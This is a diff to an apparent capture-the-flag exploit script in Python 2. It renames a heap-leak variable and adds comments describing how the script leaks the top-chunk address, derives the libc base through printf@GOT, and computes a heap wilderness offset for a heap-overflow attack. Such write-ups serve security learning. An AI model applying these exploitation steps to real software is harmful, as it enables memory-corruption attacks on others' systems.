@@ -81,6 +81,10 @@ if __name__ == "__main__":
     r.recvuntil("what's your name?")
     send("babo")
 
+
+    #
+    # leak the address of TOP CHUNK
+    #
     send("c")
     send("n")
     send("a")
@@ -92,12 +96,15 @@ if __name__ == "__main__":
     send("p")
     resp = recv_all()
     print resp
-    LEAKED_HEAP_ADDR = int(resp.split("\n")[3].split("-")[0])
+    LEAKED_TOP_CHUNK_ADDR = int(resp.split("\n")[3].split("-")[0])
     send("q")
-    print "LEAKED_HEAP_ADDR: 0x{:08x}".format(LEAKED_HEAP_ADDR)
+    print "LEAKED_TOP_CHUNK_ADDR: 0x{:08x}".format(LEAKED_TOP_CHUNK_ADDR)
 
     raw_input("continue?")
 
+    #
+    # calc LIBC_BASE
+    #
     print "add address 0x{:08x} from printf@GOT to leak.".format(0x804d010)
     add_leak(0x804d010, groom=0x200)
     leaked = parse_ingredient()
@@ -135,8 +142,9 @@ if __name__ == "__main__":
 
     raw_input("continue?")
 
-    # used gdb to calc the offset
-    HEAP_WILDERNESS = LEAKED_HEAP_ADDR + 0x4ddc
+    # top chunk has been shrunken as the result of a series of malloc operations.
+    # used gdb to calc the offset 0x4ddc
+    HEAP_WILDERNESS = LEAKED_TOP_CHUNK_ADDR + 0x4ddc
     print "the heap wilderness: 0x{:08x}".format(HEAP_WILDERNESS)
 
     raw_input("continue?")
